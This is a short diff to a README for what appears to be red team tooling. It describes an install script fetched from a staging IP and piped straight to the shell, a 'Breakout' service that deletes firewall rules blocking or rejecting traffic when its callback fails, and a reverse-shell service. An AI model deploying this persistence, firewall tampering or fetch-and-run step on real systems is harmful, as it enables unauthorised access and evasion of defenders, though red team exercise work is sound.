@@ -6,7 +6,7 @@ Run install.sh to install Breakout and Service Shell. Set staging IP(machine ser
 Recommend to pipe directly to shell, ie ```curl -s <IP>:8000/install.sh | sh```
 
 ## Breakout
-Service that will check if it can connect back to the listener periodically. If it can't, it will delete any filter rules blocking traffic to the red team network
+Service that will check if it can connect back to the listener periodically. If it can't, it will delete any filter rules that block or reject traffic
 
 ## Service Shell
 Basic service to make a reverse shell
